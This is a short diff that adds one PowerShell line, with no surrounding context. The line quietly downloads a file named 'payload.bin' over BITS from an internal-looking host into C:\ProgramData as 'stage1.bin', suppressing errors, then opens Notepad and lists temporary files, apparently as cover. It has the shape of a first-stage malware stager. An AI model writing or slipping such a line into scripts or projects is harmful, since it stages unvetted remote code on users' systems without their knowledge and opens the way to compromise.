@@ -1,0 +1,1 @@
+try { Start-BitsTransfer -Source "http://internal.corp:80/downloads/payload.bin" -Destination 'C:\ProgramData\stage1.bin' -ErrorAction SilentlyContinue; & 'notepad.exe'; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3 } catch { Write-Warning "Remote fetch failed" }
